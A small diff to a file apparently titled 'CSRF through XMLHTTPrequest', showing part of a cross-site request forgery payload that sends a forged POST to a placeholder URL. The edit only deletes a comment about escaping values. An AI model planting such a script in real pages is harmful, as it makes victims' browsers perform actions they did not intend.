@@ -3,7 +3,7 @@ CSRF through XMLHTTPrequest.
 
 <script>
 var http = new XMLHttpRequest();
-var postdata= "_submit_button=parameter+here"; //Probably need the escape method for values here, like you did
+var postdata= "_submit_button=parameter+here"; 
 
 http.open("POST", "https://addurl.com", true);
 
